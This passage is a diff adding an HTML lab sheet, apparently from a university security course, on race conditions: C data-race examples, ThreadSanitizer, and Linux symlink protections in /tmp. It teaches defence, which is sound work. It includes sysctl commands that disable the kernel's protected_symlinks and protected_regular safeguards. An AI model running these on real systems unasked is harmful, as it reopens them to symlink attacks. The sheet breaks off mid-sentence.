@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>CITS3007 lab 9 (week 11) – Race conditions</title>
+  <style>
+html {
+line-height: 1.5;
+font-family: sans-serif;
+font-size: 12pt;
+color: black;
+background-color: white;
+}
+body {
+margin: 0 auto;
+max-width: 50em;
+padding-left: 50px;
+padding-right: 50px;
+padding-top: 50px;
+padding-bottom: 50px;
+hyphens: auto;
+overflow-wrap: break-word;
+text-rendering: optimizeLegibility;
+font-kerning: normal;
+}
+@media (max-width: 600px) {
+body {
+font-size: 0.9em;
+padding: 1em;
+}
+h1 {
+font-size: 1.8em;
+}
+}
+@media print {
+body {
+background-color: transparent;
+color: black;
+font-size: 12pt;
+}
+p, h2, h3 {
+orphans: 3;
+widows: 3;
+}
+h2, h3, h4 {
+page-break-after: avoid;
+}
+}
+p {
+margin: 1em 0;
+}
+img {
+max-width: 100%;
+}
+h1, h2, h3, h4, h5, h6 {
+margin-top: 1.4em;
+}
+h5, h6 {
+font-size: 1em;
+font-style: italic;
+}
+h6 {
+font-weight: normal;
+}
+ol, ul {
+padding-left: 1.7em;
+margin-top: 1em;
+}
+li > ol, li > ul {
+margin-top: 0;
+}
+blockquote {
+margin: 1em 0 1em 1.7em;
+padding-left: 1em;
+border-left: 2px solid #e6e6e6;
+color: #606060;
+}
+code {
+font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+background-color: hsl(0, 0%, 98%);
+padding: .2em .4em;
+font-size: 85%;
+margin: 0;
+}
+pre {
+margin: 1em 0;
+background-color: hsl(0, 0%, 98%);
+padding: 1em;
+overflow: auto;
+}
+pre code {
+padding: 0;
+overflow: visible;
+overflow-wrap: normal;
+}
+
+:not(pre) > code {
+padding: 2px 4px;
+font-size: 90%;
+word-break: normal !important;
+white-space: nowrap;
+color: hsl(344.8,69%,10%);
+background-color: hsl(342.9,37%,96%);
+border-radius: 4px;
+}
+.sourceCode {
+background-color: hsl(0, 0%, 98%);
+overflow: visible;
+}
+hr {
+background-color: #1a1a1a;
+border: none;
+height: 1px;
+margin: 1em 0;
+}
+table {
+margin: 1em 0;
+border-collapse: collapse;
+width: 100%;
+overflow-x: auto;
+display: block;
+font-variant-numeric: lining-nums tabular-nums;
+}
+table caption {
+margin-bottom: 0.75em;
+}
+tbody {
+margin-top: 0.5em;
+border-top: 1px solid black;
+border-bottom: 1px solid black;
+}
+th {
+border-top: 1px solid black;
+padding: 0.25em 0.5em 0.25em 0.5em;
+}
+td {
+padding: 0.125em 0.5em 0.25em 0.5em;
+}
+header {
+margin-bottom: 4em;
+text-align: center;
+}
+#TOC li {
+list-style: none;
+}
+#TOC ul {
+padding-left: 1.3em;
+}
+#TOC > ul {
+padding-left: 0;
+}
+#TOC a:not(:hover) {
+text-decoration: none;
+}
+span.smallcaps{font-variant: small-caps;}
+span.underline{text-decoration: underline;}
+div.column{display: inline-block; vertical-align: top; width: 50%;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+{ counter-reset: source-line 0; }
+pre.numberSource code > span
+{ position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+{ content: counter(source-line);
+position: relative; left: -1em; text-align: right; vertical-align: baseline;
+border: none; display: inline-block;
+-webkit-touch-callout: none; -webkit-user-select: none;
+-khtml-user-select: none; -moz-user-select: none;
+-ms-user-select: none; user-select: none;
+padding: 0 4px; width: 4em;
+color: #aaaaaa;
+}
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa; padding-left: 4px; }
+div.sourceCode
+{ }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } 
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } 
+code span.at { color: #7d9029; } 
+code span.bn { color: #40a070; } 
+code span.bu { color: #008000; } 
+code span.cf { color: #007020; font-weight: bold; } 
+code span.ch { color: #4070a0; } 
+code span.cn { color: #880000; } 
+code span.co { color: #60a0b0; font-style: italic; } 
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } 
+code span.do { color: #ba2121; font-style: italic; } 
+code span.dt { color: #902000; } 
+code span.dv { color: #40a070; } 
+code span.er { color: #ff0000; font-weight: bold; } 
+code span.ex { } 
+code span.fl { color: #40a070; } 
+code span.fu { color: #06287e; } 
+code span.im { color: #008000; font-weight: bold; } 
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } 
+code span.kw { color: #007020; font-weight: bold; } 
+code span.op { color: #666666; } 
+code span.ot { color: #007020; } 
+code span.pp { color: #bc7a00; } 
+code span.sc { color: #4070a0; } 
+code span.ss { color: #bb6688; } 
+code span.st { color: #4070a0; } 
+code span.va { color: #19177c; } 
+code span.vs { color: #4070a0; } 
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } 
+</style>
+  <style>
+div.solutions {
+border: solid 2pt hsla(120, 100%, 35%, 1);
+border-radius: 5pt;
+background-color: hsla(120, 100%, 50%, 0.1);
+padding: 1em;
+}
+.block-caption {
+display: block;
+font-family: sans-serif;
+font-weight: bold;
+margin-bottom: 1.5rem;
+text-align: center;
+}
+details[open] summary *.only-open {
+opacity: 0.1;
+}
+</style>
+<script data-external="1" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml-full.js" type="text/javascript">
+</script>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">CITS3007 lab 9 (week 11) – Race conditions</h1>
+</header>
+<nav id="TOC" role="doc-toc">
+<h2 id="toc-title">Contents</h2>
+<ul>
+<li><a href="#background" id="toc-background"><span class="toc-section-number">1</span> Background</a></li>
+<li><a href="#data-races-and-threadsanitizer" id="toc-data-races-and-threadsanitizer"><span class="toc-section-number">2</span> Data races and
+ThreadSanitizer</a></li>
+<li><a href="#protection-against-symlink-attacks" id="toc-protection-against-symlink-attacks"><span class="toc-section-number">3</span> Protection against symlink
+attacks</a></li>
+<li><a href="#setuid-append" id="toc-setuid-append"><span class="toc-section-number">4</span> A setuid program</a></li>
+<li><a href="#challenge-exercise-exploiting-append.c" id="toc-challenge-exercise-exploiting-append.c"><span class="toc-section-number">5</span> Challenge exercise – exploiting
+<code>append.c</code></a>
+<ul>
+<li><a href="#launching-the-race-condition-attack" id="toc-launching-the-race-condition-attack"><span class="toc-section-number">5.1</span> Launching the race condition
+attack</a></li>
+</ul></li>
+</ul>
+</nav>
+<h1 data-number="1" id="background"><span class="header-section-number">1</span> Background</h1>
+<p>This lab explores <em>race condition</em> vulnerabilities. A race
+condition is any situation where the timing or order of events affects
+the correctness of programs or code. For a race condition to occur, some
+form of <em>concurrency</em> must exist – e.g., multiple processes or
+threads of control running at the same time – as well as some sort of
+mutable resource. A race condition occurs when the same data is accessed
+and written by multiple threads of control or processes.</p>
+<p>A common sort of resource for programs to use is files in the
+filesystem. If a <code>setuid</code> program that uses files has a race
+condition vulnerability, attackers may be able to run a parallel process
+and attempt to subvert the program behaviour.</p>
+<dl>
+<dt><strong>Question 1(a)</strong></dt>
+<dd>
+<p>Is a program with a race condition always guaranteed to work
+correctly? Is an attack on a program with a race condition always
+guaranteed to succeed?</p>
+</dd>
+<dt><strong>Question 1(b)</strong></dt>
+<dd>
+<p>What is a symlink attack? See if you can find out how they are
+typically defined, and how they can be protected against. How do they
+relate to race conditions? If a race condition is involved, identify the
+resource being altered.</p>
+</dd>
+</dl>
+<!--
+This lab covers the following topics:
+
+- Race condition vulnerability
+- Sticky symlink protection
+- Principle of least privilege
+
+-->
+<!--
+lab questions to add
+
+Checkpoint 1. What is a race condition?
+Checkpoint 2. What is the general target for race condition attacks?
+Checkpoint 3. What is the TOCTTOU (Time Of Check To Time Of Use) design flaw?
+Checkpoint 4. What is the relationship between TOCTTOU design flaw and the race condition attack?
+Checkpoint 5. Explain if a race condition is always guaranteed to succeed.
+Checkpoint 6. What is a symlink / path attack?
+Checkpoint 7. How is a symlink / path attack related to a race condition?
+-->
+<h1 data-number="2" id="data-races-and-threadsanitizer"><span class="header-section-number">2</span> Data races and
+ThreadSanitizer</h1>
+<p>In multithreaded programs, it may be possible for multiple threads to
+access some memory location. If two threads access the same variable
+concurrently and at least one of the accesses is a write, then that is a
+<em>data race</em>, and it is undefined behaviour in C.</p>
+<p>Save the following program as <code>race1.c</code>, and compile it
+with:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> <span class="at">-std</span><span class="op">=</span>c11 <span class="at">-pedantic-errors</span> <span class="at">-Wall</span> <span class="at">-Wextra</span> <span class="at">-pthread</span> <span class="at">-o</span> race1 race1.c</span></code></pre></div>
+<p>Program <code>race1.c</code>:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;pthread.h&gt;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> COUNTER <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="co">// func does no synchronization of `COUNTER`</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span><span class="op">*</span> increment_counter<span class="op">(</span><span class="dt">void</span><span class="op">*</span> arg<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>  <span class="op">(</span><span class="dt">void</span><span class="op">)</span> arg<span class="op">;</span> <span class="co">// cast away arg to avoid unused parameter warnings</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">1000</span> <span class="op">*</span> <span class="dv">1000</span><span class="op">;</span> <span class="op">++</span>i<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    COUNTER<span class="op">++;</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> NULL<span class="op">;</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>  pthread_t thread1<span class="op">,</span> thread2<span class="op">;</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>  <span class="co">// create two threads</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>  pthread_create<span class="op">(&amp;</span>thread1<span class="op">,</span> NULL<span class="op">,</span> increment_counter<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>  pthread_create<span class="op">(&amp;</span>thread2<span class="op">,</span> NULL<span class="op">,</span> increment_counter<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>  <span class="co">// wait for both threads to finish</span></span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a>  pthread_join<span class="op">(</span>thread1<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>  pthread_join<span class="op">(</span>thread2<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Print the final value of the COUNTER</span></span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;Final COUNTER value: </span><span class="sc">%d\n</span><span class="st">&quot;</span><span class="op">,</span> COUNTER<span class="op">);</span></span>
+<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-30"><a href="#cb2-30" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb2-31"><a href="#cb2-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>This program uses the Pthreads library to control program
+threads.</p>
+<p>Two threads are created using the <code>pthread_create</code>
+function, and <code>main</code> waits for them to finish by calling
+<code>pthread_join</code>. Both threads try to increment the variable
+<code>COUNTER</code> 1 million times. However, they are doing so without
+any sort of synchronization, so this counts as a data race and is
+undefined behaviour.</p>
+<p>If the threads incremented <code>COUNTER</code> “correctly”, we’d
+expected <code>COUNTER</code> to have a final value of 2,000,000.</p>
+<p>Run the program, and see what result you get.</p>
+<p>Because reads and writes of the variable can overlap unpredictably,
+we will typically see a value greater than 1 million, but less than 2
+million. (Technically, any sort of behaviour is <em>possible</em>,
+because our program is invoking undefined behaviour; but using GCC
+should reliably produce a value in that range.)</p>
+<p>Because data races are undefined behaviour, a compiler is allowed to
+assume that they never occur. Furthermore, during the course of
+executing a function, a compiler is allowed to use existing variables
+like <code>COUNTER</code> for temporary storage it might need, as long
+as it restores them by the time the function is ended. Combined, these
+two facts could mean that a variable like <code>COUNTER</code> could end
+up with “junk” values in it that bear no resemblance to what we expect.
+(Although in the above program, this is actually unlikely.)</p>
+<!--
+source:
+https://web.archive.org/web/20160307150040/https://software.intel.com/en-us/blogs/2013/01/06/benign-data-races-what-could-possibly-go-wrong
+-->
+<p>We can detect this race condition using <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual">ThreadSanitizer</a>
+(TSan, for short). Compile again with the following command. (When
+compiling, we add the <code>-g</code> option to improve error messages
+printed by TSan, but you can also leave it off.)</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> <span class="at">-g</span> <span class="at">-std</span><span class="op">=</span>c11 <span class="at">-pedantic-errors</span> <span class="at">-Wall</span> <span class="at">-Wextra</span> <span class="at">-fsanitize</span><span class="op">=</span>thread <span class="at">-pthread</span> <span class="at">-o</span> race1 race1.c</span></code></pre></div>
+<p>Then run the program. You should see output something like the
+following:</p>
+<pre class="plain"><code>  ==================
+  WARNING: ThreadSanitizer: data race (pid=590418)
+    Read of size 4 at 0x561c214a7014 by thread T2:
+      #0 operation2 /home/vagrant/race1.c:11 (race1+0x12f1)
+  
+    Previous write of size 4 at 0x561c214a7014 by thread T1:
+      #0 operation1 /home/vagrant/race1.c:11 (race1+0x12ac)
+  
+    Location is global &#39;COUNTER&#39; of size 4 at 0x561c214a7014 (race1+0x000000004014)
+  
+    Thread T2 (tid=590421, running) created by main thread at:
+      #0 pthread_create ../../../../src/libsanitizer/tsan/tsan_interceptors_posix.cpp:969 (libtsan.so.0+0x605b8)
+      #1 main /home/vagrant/race1.c:21 (race1+0x1388)
+  
+    Thread T1 (tid=590420, finished) created by main thread at:
+      #0 pthread_create ../../../../src/libsanitizer/tsan/tsan_interceptors_posix.cpp:969 (libtsan.so.0+0x605b8)
+      #1 main /home/vagrant/race1.c:20 (race1+0x1367)
+  
+  SUMMARY: ThreadSanitizer: data race /home/vagrant/race1.c:11 in increment_counter
+  ==================
+  Final COUNTER value: 2000000
+  ThreadSanitizer: reported 1 warnings</code></pre>
+<p>When we compile with ThreadSanitizer, our program is instrumented
+(i.e., extra instructions are added) so that it keeps track of the
+accesses each thread makes to memory. By default, the last <span class="math inline">\(2^{17}\)</span>, or roughly 128,000, accesses are
+tracked. It is possible to alter this number when your program is
+invoked. The following invocation</p>
+<pre><code>$ TSAN_OPTIONS=&quot;history_size=3&quot; ./race1</code></pre>
+<p>will double the number of accesses tracked.<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a> If
+the ThreadSanitizer finds that more than one of those accesses is to the
+same memory location, and at least one of those accesses was a write,
+then this will be flagged as being a race condition.</p>
+<dl>
+<dt><strong>Question 1(a)</strong></dt>
+<dd>
+<p>Find out what resources are used by a program with TSan enabled,
+compared with a program which does not have it enabled.</p>
+</dd>
+</dl>
+<p>However, ThreadSanitizer is not infallible, as we will demonstrate.
+Here is a second program – save it as <code>race2.c</code>:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;pthread.h&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> GLOBAL<span class="op">;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span><span class="op">*</span> operation1<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>x<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>  GLOBAL <span class="op">=</span> <span class="dv">99</span><span class="op">;</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> x<span class="op">;</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>  pthread_t t<span class="op">;</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>  pthread_create<span class="op">(&amp;</span>t<span class="op">,</span> NULL<span class="op">,</span> operation1<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>  GLOBAL <span class="op">=</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>  pthread_join<span class="op">(</span>t<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>GLOBAL <span class="op">==</span> <span class="dv">99</span><span class="op">)</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> EXIT_SUCCESS<span class="op">;</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span></span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> EXIT_FAILURE<span class="op">;</span></span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Compile it as follows:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> gcc <span class="at">-g</span> <span class="at">-std</span><span class="op">=</span>c11 <span class="at">-pedantic-errors</span> <span class="at">-Wall</span> <span class="at">-Wextra</span> <span class="at">-pthread</span> <span class="at">-o</span> race2 race2.c</span></code></pre></div>
+<p>In this program, a thread is spawned which sets the value of
+<code>GLOBAL</code> to 99, while the <code>main</code> function
+concurrently sets it to 100 – this again, is a data race. Typically, the
+<code>main</code> function will “win”, and the value will be 100, but
+sometimes not. We can demonstrate this by running the following Bash
+code:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> i=0 <span class="kw">;</span> <span class="cf">while</span> <span class="ex">./race2</span> <span class="kw">;</span> <span class="cf">do</span> <span class="bu">echo</span> <span class="va">$i</span> <span class="kw">;</span> <span class="va">i</span><span class="op">=</span><span class="va">$((i</span><span class="op">+</span><span class="dv">1</span><span class="va">))</span> <span class="kw">;</span> <span class="cf">done</span></span></code></pre></div>
+<p>In the cases where the <code>main</code> function “wins”,
+<code>race2</code> will exit with exit code 1, and the while loop will
+continue. However, if the thread “wins”, <code>race2</code> will exit
+with exit code 0, and the while loop will halt. If you run the program,
+you should see the <code>main</code> function “win” many times, but
+eventually, the thread will succeed instead – and the value of
+<code>i</code> will show how many times we had to run the program before
+this happened. (Typical values are somewhere in the thousands, but it
+could sometimes be higher or lower.)</p>
+<p>Now compile the program and run it with ThreadSanitizer enabled:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> gcc <span class="at">-g</span> <span class="at">-std</span><span class="op">=</span>c11 <span class="at">-pedantic-errors</span> <span class="at">-Wall</span> <span class="at">-Wextra</span> <span class="at">-fsanitize</span><span class="op">=</span>thread <span class="at">-pthread</span> <span class="at">-o</span> race2 race2.c</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> i=0<span class="kw">;</span> <span class="cf">while</span> <span class="kw">(</span><span class="ex">./race2</span> <span class="kw">;</span> <span class="bu">[</span> <span class="va">$?</span> <span class="ot">-ne</span> 66 <span class="bu">]</span><span class="kw">);</span> <span class="cf">do</span> <span class="bu">echo</span> <span class="va">$i</span><span class="kw">;</span> <span class="va">i</span><span class="op">=</span><span class="va">$((i</span><span class="op">+</span><span class="dv">1</span><span class="va">))</span><span class="kw">;</span> <span class="cf">done</span></span></code></pre></div>
+<p>By default, if TSan detects a race condition, the program exits with
+exit code 66 (see the <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerFlags">TSan
+options documentation</a>). (We could alter this by invoking our program
+with, say, <code>TSAN_OPTIONS=&quot;exitcode=3&quot; ./race2</code> if we wanted
+to force the exit code to be 3 instead.) Our <code>while</code> loop
+continues to run until TSan does detect a race condition.</p>
+<p>You will typically see that TSan does not always detect a race
+condition, but eventually does. Why does TSan not always detect the
+race? Because sometimes, the line <code>GLOBAL = 100</code> is executed
+before the operating system has finished creating a new thread at all.
+In that case, TSan does not “kick in” until the thread is created, and
+doesn’t realize that the thread is altering a variable which was also
+altered in <code>main</code>.</p>
+<dl>
+<dt><strong>Exercise</strong></dt>
+<dd>
+<p>The traditional way to protect against a data race in this program
+would be to either use <em>atomic types</em> (i.e. alter the type of
+<code>GLOBAL</code>), or to use <em>locks</em> (e.g. mutexes – “mutual
+exclusion locks”). See if you can amend the program to use one of these
+two approaches. Which of these approaches can successfully fix the
+issue?</p>
+</dd>
+</dl>
+<h1 data-number="3" id="protection-against-symlink-attacks"><span class="header-section-number">3</span> Protection against symlink
+attacks</h1>
+<p>Recent versions of Ubuntu (10.10 and later) come with a built-in
+protection against some race condition attacks. Specifically, they
+mitigate against some symbolic link (symlink) attacks (which we saw in
+lectures).</p>
+<p>In the CITS3007 development environment, we will create a new user
+(in addition to the “<code>vagrant</code>” user we log in as) with their
+own home directory:</p>
+<pre><code>$ sudo adduser --disabled-password --gecos &#39;&#39; user2</code></pre>
+<p>As that user, we’ll create a new file and a symlink to it:</p>
+<pre><code>$ sudo su user2 -c &#39;echo hello &gt; /home/user2/file&#39;
+$ sudo su user2 -c &#39;ln -s /home/user2/file /home/user2/link&#39;</code></pre>
+<p>By default, a user’s new files are world readable, so the
+<code>vagrant</code> user can read the file and the symlink:</p>
+<pre><code>$ ls -l ~user2
+total 4
+-rw-rw-r-- 1 user2 user2  6 Sep 27 00:31 file
+lrwxrwxrwx 1 user2 user2 16 Sep 27 00:32 link -&gt; /home/user2/file
+$ cat /home/user2/file
+hello</code></pre>
+<p>Note that the permissions of the symlink are “<code>rwx</code>” for
+user, group and the “world” – this is because on Linux, symlinks have no
+“permissions” of their own; permissions are taken from the file being
+linked to.</p>
+<p>As <code>user2</code>, we’ll try removing “world” permissions from
+the symlink:</p>
+<pre><code>$ sudo su user2 -c &#39;chmod o-r /home/user2/link&#39;</code></pre>
+<p>Does this make a difference to the permissions of the
+<code>link</code> file, as displayed by <code>ls</code>? Can the
+<code>vagrant</code> user still access it?</p>
+<p>Now we’ll try making a symlink again, but putting it in the
+<code>/tmp</code> directory:</p>
+<pre><code>$ sudo su user2 -c &#39;ln -s /home/user2/file /tmp/link&#39;</code></pre>
+<p>What happens if you execute the command <code>cat /tmp/link</code>
+(as the <code>vagrant user</code>)?</p>
+<p>The <code>tmp</code> directory has special permissions, on Unix-like
+systems. Run <code>ls -ld /tmp</code>, and you should see output like
+the following:</p>
+<pre><code>$ ls -ld /tmp
+drwxrwxrwt 12 root root 4096 Sep 27 00:38 /tmp</code></pre>
+<p>The “<code>t</code>” at the end of the permissions means a permission
+bit called the “sticky bit” has been set for the <code>/tmp</code>
+directory. When this bit is set on a directory, and some user creates a
+file in it, other users (except for the owner of the directory, and of
+course <code>root</code>) are prevented from deleting or renaming the
+file.</p>
+<!--
+  TODO: exercise showing this
+-->
+<p>The sticky bit is set on the <code>/tmp</code> directory to ensure
+one user’s temporary files can’t be renamed or deleted by other users.
+In addition to this, the Linux kernel introduced <a href="https://lwn.net/Articles/390323/">additional protections</a>:
+symbolic links in world-writable sticky directories (such as
+<code>/tmp</code>) can <em>only be followed</em> if the follower (i.e.,
+the user executing a command) and the directory owner (that is,
+<code>root</code>, in the case of the <code>/tmp</code> directory) match
+the symlink owner.</p>
+<!--
+  TODO: exercise showing this
+-->
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+<div class="block-caption">
+<p>Are built-in symlink protections enough?</p>
+</div>
+<p>In general, these built-in protections provided by the kernel are
+<strong>not</strong> sufficient security for safely creating temporary
+files. It’s usually best to ensure that only the actual user of a
+process can even list or read temporary files: a program should create
+its own temporary <em>directory</em> under <code>/tmp</code>, to which
+only the actual user has read, write or execute access, and then create
+needed temporary files within that directory.)</p>
+</div>
+<p>This protection can be removed by running the following command,
+which alters kernel parameters:<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></p>
+<pre><code>$ sudo sysctl -w fs.protected_symlinks=0</code></pre>
+<p>If you try the previous exercises again, you should see that this
+time, the <code>vagrant</code> user <em>can</em> run
+<code>cat /tmp/link</code> without a “permission denied” error.</p>
+<p>Another protection was added in Ubuntu 20.04: even root cannot write
+to files in <code>/tmp</code> that are owned by others. That can be
+disabled by running the following command:</p>
+<pre><code>$ sudo sysctl fs.protected_regular=0</code></pre>
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+<div class="block-caption">
+<p>Linux security modules</p>
+</div>
+<p>In earlier versions of the Linux kernel (for instance, on Ubuntu
